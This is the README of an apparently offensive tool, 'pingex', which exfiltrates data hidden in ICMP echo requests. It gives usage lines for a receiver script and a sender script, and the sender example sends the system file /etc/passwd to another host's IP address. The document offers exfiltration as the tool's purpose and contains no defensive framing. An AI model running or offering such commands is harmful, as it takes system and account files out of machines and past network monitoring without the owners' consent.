# pingex

Exfiltrate data using ICMP Echo Requests

## Usage

### Receiver

```
./receiver.py [<iface>]. Example: ./receiver.py eth0
```

### Sender

```
./sender.py <filepath> <target_ip>. Example: ./sender.py /etc/passwd 192.168.1.42
```
